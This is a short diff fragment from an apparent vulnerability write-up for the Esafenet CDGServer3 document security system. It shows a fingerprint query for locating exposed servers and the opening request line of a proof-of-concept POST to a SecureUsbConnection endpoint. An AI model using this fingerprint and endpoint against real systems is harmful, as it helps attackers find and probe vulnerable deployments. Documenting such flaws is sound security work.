@@ -8,7 +8,7 @@
 body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
 ```
 
-## poc
+## POC
 
 ```java
 POST /CDGServer3/SecureUsbConnection?command=GETSYSTEMINFO HTTP/1.1
